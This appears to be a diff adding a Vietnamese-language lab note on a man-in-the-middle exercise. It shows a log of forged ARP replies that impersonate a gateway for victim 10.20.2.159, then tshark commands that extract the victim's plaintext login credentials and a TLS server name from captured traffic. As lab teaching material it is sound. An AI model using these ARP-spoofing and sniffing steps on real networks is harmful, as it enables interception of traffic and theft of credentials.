@@ -1,0 +1,7 @@
+# 14.1 · nft-ke đọc thứ nó nghe được (chỉ gói ĐI VÀO card của nó)
+$ cat /tmp/arp.log
+gửi 12 lần: "10.20.2.1 is-at e8:6a:64:90:12:34" ⇒ 10.20.2.159 (8c:8d:28:4e:7a:12)
+$ tshark -r /tmp/nghe.pcap -Y "http.request" -T fields -e ip.src -e http.host -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null
+10.20.2.159	news.test	user,pass	SE12345,matkhau123
+$ tshark -r /tmp/nghe.pcap -Y "tls.handshake.type == 1" -T fields -e ip.src -e tls.handshake.extensions_server_name 2>/dev/null
+10.20.2.159	news.test
